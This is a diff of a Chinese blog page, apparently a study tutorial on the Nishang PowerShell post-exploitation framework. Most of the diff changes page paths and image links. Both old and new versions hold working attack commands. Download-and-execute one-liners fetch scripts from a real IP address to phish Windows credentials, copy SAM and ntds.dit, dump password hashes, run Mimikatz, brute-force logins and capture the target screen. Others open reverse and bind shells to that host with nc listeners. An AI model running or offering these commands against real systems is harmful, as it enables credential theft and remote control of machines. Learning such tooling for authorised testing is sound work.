@@ -7,8 +7,8 @@
 
 <head>
   <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
-  <link rel="icon" href="/img/fluid.png">
+  <link rel="apple-touch-icon" sizes="76x76" href="../../../../../img/fluid.png">
+  <link rel="icon" href="../../../../../img/fluid.png">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
@@ -25,7 +25,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://idea-oss.github.io/img/nishang.png">
 <meta property="article:published_time" content="2022-06-14T18:17:18.000Z">
-<meta property="article:modified_time" content="2022-06-15T05:39:50.110Z">
+<meta property="article:modified_time" content="2024-01-07T10:00:24.825Z">
 <meta property="article:author" content="iDea">
 <meta property="article:tag" content="内网安全">
 <meta property="article:tag" content="nishang">
@@ -58,12 +58,12 @@
 <link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
 
 
-<link  rel="stylesheet" href="/css/main.css" />
+<link  rel="stylesheet" href="../../../../../css/main.css" />
 
 
-  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  <link id="highlight-css" rel="stylesheet" href="../../../../../css/highlight.css" />
   
-    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+    <link id="highlight-css-dark" rel="stylesheet" href="../../../../../css/highlight-dark.css" />
   
 
 
@@ -79,8 +79,8 @@
       Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
     }
   </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
+  <script  src="../../../../../js/utils.js" ></script>
+  <script  src="../../../../../js/color-schema.js" ></script>
 
   
 <meta name="generator" content="Hexo 6.2.0"></head>
@@ -95,7 +95,7 @@
 <div class="header-inner" style="height: 85vh;">
   <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
-    <a class="navbar-brand" href="/">
+    <a class="navbar-brand" href="../../../../../index.html">
       <strong>iDea</strong>
     </a>
 
@@ -114,7 +114,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/">
+              <a class="nav-link" href="../../../../../index.html">
                 <i class="iconfont icon-home-fill"></i>
                 首页
               </a>
@@ -126,7 +126,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/archives/">
+              <a class="nav-link" href="../../../../../archives/">
                 <i class="iconfont icon-archive-fill"></i>
                 归档
               </a>
@@ -138,7 +138,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/categories/">
+              <a class="nav-link" href="../../../../../categories/">
                 <i class="iconfont icon-category-fill"></i>
                 分类
               </a>
@@ -150,7 +150,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/tags/">
+              <a class="nav-link" href="../../../../../tags/">
                 <i class="iconfont icon-tags-fill"></i>
                 标签
               </a>
@@ -162,7 +162,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/about/">
+              <a class="nav-link" href="../../../../../about/">
                 <i class="iconfont icon-user-fill"></i>
                 关于
               </a>
@@ -191,7 +191,7 @@
   
 
 <div id="banner" class="banner" parallax=true
-     style="background: url('/./img/nishang.png') no-repeat center center; background-size: cover;">
+     style="background: url('../../../../.././img/nishang.png') no-repeat center center; background-size: cover;">
   <div class="full-bg-img">
     <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.5)">
       <div class="banner-text text-center fade-in-up">
@@ -331,37 +331,37 @@
 </tbody></table>
 <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><ul>
 <li><p><strong>Check-VM</strong><br>检查是否为虚拟机</p>
-<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">powershell -nop -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/Check-VM.ps1&#x27;)&quot;</span><span class="hljs-comment">;Check-VM</span><br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/a8c4241ddad848699962dfb7eca88b9e.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/Check-VM.ps1&#x27;)&quot;</span>;Check<span class="hljs-literal">-VM</span><br></code></pre></td></tr></table></figure>
+<p><img src="/2022/06/15/nishang%E5%AD%A6%E4%B9%A0/nishang%E5%AD%A6%E4%B9%A0/image-20240107175648796.png" srcset="/img/loading.gif" lazyload alt="image-20240107175648796"></p>
 </li>
 <li><p><strong>Invoke-CredentialsPhish</strong><br>欺骗目标主机用户，让用户输入密码。</p>
 </li>
 </ul>
-<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">powershell -nop -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/Invoke-CredentialsPhish.ps1&#x27;)&quot;</span><span class="hljs-comment">;Invoke-CredentialsPhish</span><br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/d89b62b0e86241518ba52dbac9ead982.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>输入密码弹框才会消失<br><img src="https://img-blog.csdnimg.cn/15603ca1555047878f791498efd0eedf.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/Invoke-CredentialsPhish.ps1&#x27;)&quot;</span>;<span class="hljs-built_in">Invoke-CredentialsPhish</span><br></code></pre></td></tr></table></figure>
+<p><img src="/2022/06/15/nishang%E5%AD%A6%E4%B9%A0/nishang%E5%AD%A6%E4%B9%A0/image-20240107175658135.png" srcset="/img/loading.gif" lazyload alt="image-20240107175658135"><br>输入密码弹框才会消失<br><img src="/2022/06/15/nishang%E5%AD%A6%E4%B9%A0/nishang%E5%AD%A6%E4%B9%A0/image-20240107175707103.png" srcset="/img/loading.gif" lazyload alt="image-20240107175707103"></p>
 <ul>
 <li><strong>Copy-VSS</strong><br>这个脚本利用Volume Shadow Copy服务复制sam文件，如果这个脚本运行在了DC机上，ntds.dit和system hive也能被拷贝出来</li>
 </ul>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">powershell -nop -c <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/Copy-VSS.ps1&#x27;)&quot;</span>;copy-vss -DestinationDir c:/  <br><span class="hljs-regexp">//</span>copy-vss 								 <span class="hljs-comment">#把文件保存到当前路径下</span><br><span class="hljs-regexp">//</span>copy-vss -DestinationDir c:/   <span class="hljs-comment">#把文件保存在c盘下</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/Copy-VSS.ps1&#x27;)&quot;</span>;<span class="hljs-built_in">copy-vss</span> <span class="hljs-literal">-DestinationDir</span> c:/  <br>//<span class="hljs-built_in">copy-vss</span> 								 <span class="hljs-comment">#把文件保存到当前路径下</span><br>//<span class="hljs-built_in">copy-vss</span> <span class="hljs-literal">-DestinationDir</span> c:/   <span class="hljs-comment">#把文件保存在c盘下</span><br></code></pre></td></tr></table></figure>
 
 <ul>
 <li><strong>FireBuster  FireListener扫描器</strong><br>对内网进行扫描，打开本地监听，然后远程传送数据，把包发给FireListener</li>
 </ul>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#首先在本地输入以下命令运行FireListener</span><br><span class="hljs-attribute">powershell</span> -nop -c <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/FireListener.ps1&#x27;)&quot;</span>;FireListener <span class="hljs-number">130</span>-<span class="hljs-number">150</span><br><span class="hljs-comment">#接着输入如下命令</span><br><span class="hljs-attribute">powershell</span> -nop -c <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/FireBuster.ps1&#x27;)&quot;</span>;FireBuster  <span class="hljs-number">192.168.43.161</span> <span class="hljs-number">130</span>-<span class="hljs-number">150</span> -Verbose<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/f8a75adc51744a689648b3ba4de094f5.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#首先在本地输入以下命令运行FireListener</span><br>powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/FireListener.ps1&#x27;)&quot;</span>;FireListener <span class="hljs-number">130</span><span class="hljs-literal">-150</span><br><span class="hljs-comment">#接着输入如下命令</span><br>powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/FireBuster.ps1&#x27;)&quot;</span>;FireBuster  <span class="hljs-number">192.168</span>.<span class="hljs-number">43.161</span> <span class="hljs-number">130</span><span class="hljs-literal">-150</span> <span class="hljs-literal">-Verbose</span><br></code></pre></td></tr></table></figure>
+<p><img src="/2022/06/15/nishang%E5%AD%A6%E4%B9%A0/nishang%E5%AD%A6%E4%B9%A0/image-20240107175724581.png" srcset="/img/loading.gif" lazyload alt="image-20240107175724581"></p>
 <ul>
 <li><strong>Invoke Mimikatz</strong></li>
 </ul>
-<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean">nvoke-Mimikatz  -DumpCerts    ##Dump出本机的凭证信息<br>Invoke-Mimikatz  -DumpCerts   -ComputerName @（“computer1”，“computer2”） ##Dump 出远程的两台计算机的凭证信息<br>Invoke-Mimikatz  -Command <span class="hljs-string">&quot;privillage::debug exit&quot;</span> -ComputerName <span class="hljs-string">&quot;computer1&quot;</span> ##在远程的一台机器上运行Mimikatz并执行 <span class="hljs-string">&quot;privillage::debug exit&quot;</span><br><br>powershell -nop -c <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/Invoke-Mimikatz.ps1&#x27;)&quot;</span>;Invoke-Mimikatz  -DumpCerts  <br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/c1ec5aea440749fb942f76562b454811.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell">nvoke<span class="hljs-literal">-Mimikatz</span>  <span class="hljs-literal">-DumpCerts</span>    <span class="hljs-comment">##Dump出本机的凭证信息</span><br><span class="hljs-built_in">Invoke-Mimikatz</span>  <span class="hljs-literal">-DumpCerts</span>   <span class="hljs-literal">-ComputerName</span> <span class="hljs-selector-tag">@</span>（“computer1”，“computer2”） <span class="hljs-comment">##Dump 出远程的两台计算机的凭证信息</span><br><span class="hljs-built_in">Invoke-Mimikatz</span>  <span class="hljs-literal">-Command</span> <span class="hljs-string">&quot;privillage::debug exit&quot;</span> <span class="hljs-literal">-ComputerName</span> <span class="hljs-string">&quot;computer1&quot;</span> <span class="hljs-comment">##在远程的一台机器上运行Mimikatz并执行 &quot;privillage::debug exit&quot;</span><br><br>powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/Invoke-Mimikatz.ps1&#x27;)&quot;</span>;<span class="hljs-built_in">Invoke-Mimikatz</span>  <span class="hljs-literal">-DumpCerts</span>  <br></code></pre></td></tr></table></figure>
+<p><img src="/2022/06/15/nishang%E5%AD%A6%E4%B9%A0/nishang%E5%AD%A6%E4%B9%A0/image-20240107175814167.png" srcset="/img/loading.gif" lazyload alt="image-20240107175814167"></p>
 <ul>
 <li><p><strong>Get-PassHashes</strong><br>需administrator权限</p>
-<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">powershell -nop -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/Get-PassHashes.ps1&#x27;)&quot;</span><span class="hljs-comment">;Get-PassHashes</span><br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/1b5310571bf5485d8892b11ea5e35434.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/Get-PassHashes.ps1&#x27;)&quot;</span>;<span class="hljs-built_in">Get-PassHashes</span><br></code></pre></td></tr></table></figure>
+<p><img src="/2022/06/15/nishang%E5%AD%A6%E4%B9%A0/nishang%E5%AD%A6%E4%B9%A0/image-20240107175829566.png" srcset="/img/loading.gif" lazyload alt="image-20240107175829566"></p>
 </li>
 <li><p><strong>Get-PassHints</strong><br>获取用户的密码提示信息，需administrator权限，可根据提示信息生成密码字典提高爆破成功几率</p>
-<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">powershell -nop -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/Get-PassHints.ps1&#x27;)&quot;</span><span class="hljs-comment">;Get-PassHints</span><br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/e3b3991b57c34bbe8aa4e108c917677c.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/Get-PassHints.ps1&#x27;)&quot;</span>;<span class="hljs-built_in">Get-PassHints</span><br></code></pre></td></tr></table></figure>
+<p><img src="/2022/06/15/nishang%E5%AD%A6%E4%B9%A0/nishang%E5%AD%A6%E4%B9%A0/image-20240107175843139.png" srcset="/img/loading.gif" lazyload alt="image-20240107175843139"></p>
 </li>
 <li><p><strong>Invoke-PortScan</strong></p>
 </li>
@@ -398,8 +398,8 @@
 <td>存活主机并解析主机名</td>
 </tr>
 </tbody></table>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">powershell</span> -nop -c <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Scan/Invoke-PortScan.ps1&#x27;)&quot;</span>; Invoke-PortScan -StartAddress <span class="hljs-number">192.168.43.1</span> -EndAddress <span class="hljs-number">192.168.43.50</span> -ResolveHost  <br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/712e69666696412eb16eb47c1abbc4d0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Scan/Invoke-PortScan.ps1&#x27;)&quot;</span>; <span class="hljs-built_in">Invoke-PortScan</span> <span class="hljs-literal">-StartAddress</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">43.1</span> <span class="hljs-literal">-EndAddress</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">43.50</span> <span class="hljs-literal">-ResolveHost</span>  <br></code></pre></td></tr></table></figure>
+<p><img src="/2022/06/15/nishang%E5%AD%A6%E4%B9%A0/nishang%E5%AD%A6%E4%B9%A0/image-20240107175855893.png" srcset="/img/loading.gif" lazyload alt="image-20240107175855893"></p>
 <ul>
 <li><strong>Invoke-BruteForce</strong><br>对SQL Server，域控制器(ActiveDirectory)，web以及ftp弱口令爆破</li>
 </ul>
@@ -435,12 +435,12 @@
 <td>匹配一个后停止</td>
 </tr>
 </tbody></table>
-<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">powershell</span> <span class="hljs-operator">-</span><span class="hljs-variable">nop</span> <span class="hljs-operator">-</span><span class="hljs-variable">c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Scan/Invoke-BruteForce.ps1&#x27;)&quot;</span><span class="hljs-operator">;</span><span class="hljs-variable">Invoke</span><span class="hljs-operator">-</span><span class="hljs-variable">BruteForce</span> <span class="hljs-operator">-</span><span class="hljs-variable">ComputerName</span> <span class="hljs-variable">WEB</span> <span class="hljs-operator">-</span><span class="hljs-variable">UserList</span>  <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">tools</span>\<span class="hljs-number">1.</span><span class="hljs-variable">txt</span>  <span class="hljs-operator">-</span><span class="hljs-variable">PasswordList</span> <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">tools</span>\<span class="hljs-number">1.</span><span class="hljs-variable">txt</span>  <span class="hljs-operator">-</span><span class="hljs-variable">Service</span> <span class="hljs-variable">FTP</span> <span class="hljs-operator">-</span><span class="hljs-built_in">Verbose</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Scan/Invoke-BruteForce.ps1&#x27;)&quot;</span>;<span class="hljs-built_in">Invoke-BruteForce</span> <span class="hljs-literal">-ComputerName</span> WEB <span class="hljs-literal">-UserList</span>  C:\tools\<span class="hljs-number">1</span>.txt  <span class="hljs-literal">-PasswordList</span> C:\tools\<span class="hljs-number">1</span>.txt  <span class="hljs-literal">-Service</span> FTP <span class="hljs-literal">-Verbose</span><br></code></pre></td></tr></table></figure>
 
 <ul>
 <li><strong>屏幕窃取</strong><br>Show-TargetScreen脚本使用MJPEG传输目标机远程桌面的实时画面。</li>
 </ul>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Show</span>-TargetScreen -Reverse -IPAddress <span class="hljs-number">1.116.233.115</span> -Port <span class="hljs-number">443</span>  #Reverse反向连接 Bind  正向连接<br><br><span class="hljs-attribute">powershell</span> -nop -c <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/Show-TargetScreen.ps1&#x27;)&quot;</span>;Show-TargetScreen -Reverse -IPAddress <span class="hljs-number">1.116.233.115</span> -Port <span class="hljs-number">1111</span><br><span class="hljs-comment">#在攻击机上</span><br><span class="hljs-attribute">nc</span> -nlvp <span class="hljs-number">1111</span>| nc -nlvp <span class="hljs-number">9999</span>   #访问本机<span class="hljs-number">9999</span>端口即可<br></code></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Show-TargetScreen</span> <span class="hljs-literal">-Reverse</span> <span class="hljs-literal">-IPAddress</span> <span class="hljs-number">1.116</span>.<span class="hljs-number">233.115</span> <span class="hljs-literal">-Port</span> <span class="hljs-number">443</span>  <span class="hljs-comment">#Reverse反向连接 Bind  正向连接</span><br><br>powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Gather/Show-TargetScreen.ps1&#x27;)&quot;</span>;<span class="hljs-built_in">Show-TargetScreen</span> <span class="hljs-literal">-Reverse</span> <span class="hljs-literal">-IPAddress</span> <span class="hljs-number">1.116</span>.<span class="hljs-number">233.115</span> <span class="hljs-literal">-Port</span> <span class="hljs-number">1111</span><br><span class="hljs-comment">#在攻击机上</span><br>nc <span class="hljs-literal">-nlvp</span> <span class="hljs-number">1111</span>| nc <span class="hljs-literal">-nlvp</span> <span class="hljs-number">9999</span>   <span class="hljs-comment">#访问本机9999端口即可</span><br></code></pre></td></tr></table></figure>
 
 <h2 id="powershell-隐藏通信隧道"><a href="#powershell-隐藏通信隧道" class="headerlink" title="powershell 隐藏通信隧道"></a>powershell 隐藏通信隧道</h2><ul>
 <li>I<strong>nvoke-PowershellTcp</strong></li>
@@ -457,7 +457,7 @@
 <td>选择-Reverse选项时表示需要连接的IP地址</td>
 </tr>
 <tr>
-<td>Port<int32></td>
+<td>Port<int32></int32></td>
 <td>选择-Reverse选项时表示需要连接的端口，选择-Bind选项时表示需要监听的端口</td>
 </tr>
 <tr>
@@ -469,34 +469,34 @@
 <td>正向连接</td>
 </tr>
 </tbody></table>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#反向</span><br><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">3333</span><br><br><span class="hljs-attribute">powershell</span> -nop -c <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Shells/Invoke-PowerShellTcp.ps1&#x27;)&quot;</span>;Invoke-PowerShellTcp -Reverse -IPAddress <span class="hljs-number">1.116.233.115</span> -Port <span class="hljs-number">3333</span><br><span class="hljs-comment">#正向</span><br><span class="hljs-attribute">nc</span> -nv <span class="hljs-number">192.168.1.1</span>  <span class="hljs-number">3333</span><br><br><span class="hljs-attribute">powershell</span> -nop -c <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Shells/Invoke-PowerShellTcp.ps1&#x27;)&quot;</span>;Invoke-PowerShellTcp  -Bind  -Port <span class="hljs-number">3333</span><br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/0d10bf1ddf1a400b943c0a000bb2652a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#反向</span><br>nc <span class="hljs-literal">-lvp</span> <span class="hljs-number">3333</span><br><br>powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Shells/Invoke-PowerShellTcp.ps1&#x27;)&quot;</span>;<span class="hljs-built_in">Invoke-PowerShellTcp</span> <span class="hljs-literal">-Reverse</span> <span class="hljs-literal">-IPAddress</span> <span class="hljs-number">1.116</span>.<span class="hljs-number">233.115</span> <span class="hljs-literal">-Port</span> <span class="hljs-number">3333</span><br><span class="hljs-comment">#正向</span><br>nc <span class="hljs-literal">-nv</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span>  <span class="hljs-number">3333</span><br><br>powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Shells/Invoke-PowerShellTcp.ps1&#x27;)&quot;</span>;<span class="hljs-built_in">Invoke-PowerShellTcp</span>  <span class="hljs-literal">-Bind</span>  <span class="hljs-literal">-Port</span> <span class="hljs-number">3333</span><br></code></pre></td></tr></table></figure>
+<p><img src="/2022/06/15/nishang%E5%AD%A6%E4%B9%A0/nishang%E5%AD%A6%E4%B9%A0/image-20240107175926709.png" srcset="/img/loading.gif" lazyload alt="image-20240107175926709"></p>
 <ul>
 <li><strong>Invoke-PowershellUdp</strong></li>
 </ul>
-<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm">正向：nc -nvu <span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span> <span class="hljs-number">3333</span><br>反向:   nc -lup <span class="hljs-number">3333</span><br><br><br>powershell -nop -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Shells/Invoke-PowerShellUdp.ps1&#x27;)&quot;</span><span class="hljs-comment">;Invoke-PowerShellUdp -Reverse -IPAddress 1.116.233.115 -Port 3333</span><br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/9c9cfaad0b6e4395a2364804e85267fe.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell">正向：nc <span class="hljs-literal">-nvu</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span> <span class="hljs-number">3333</span><br>反向:   nc <span class="hljs-literal">-lup</span> <span class="hljs-number">3333</span><br><br><br>powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Shells/Invoke-PowerShellUdp.ps1&#x27;)&quot;</span>;<span class="hljs-built_in">Invoke-PowerShellUdp</span> <span class="hljs-literal">-Reverse</span> <span class="hljs-literal">-IPAddress</span> <span class="hljs-number">1.116</span>.<span class="hljs-number">233.115</span> <span class="hljs-literal">-Port</span> <span class="hljs-number">3333</span><br></code></pre></td></tr></table></figure>
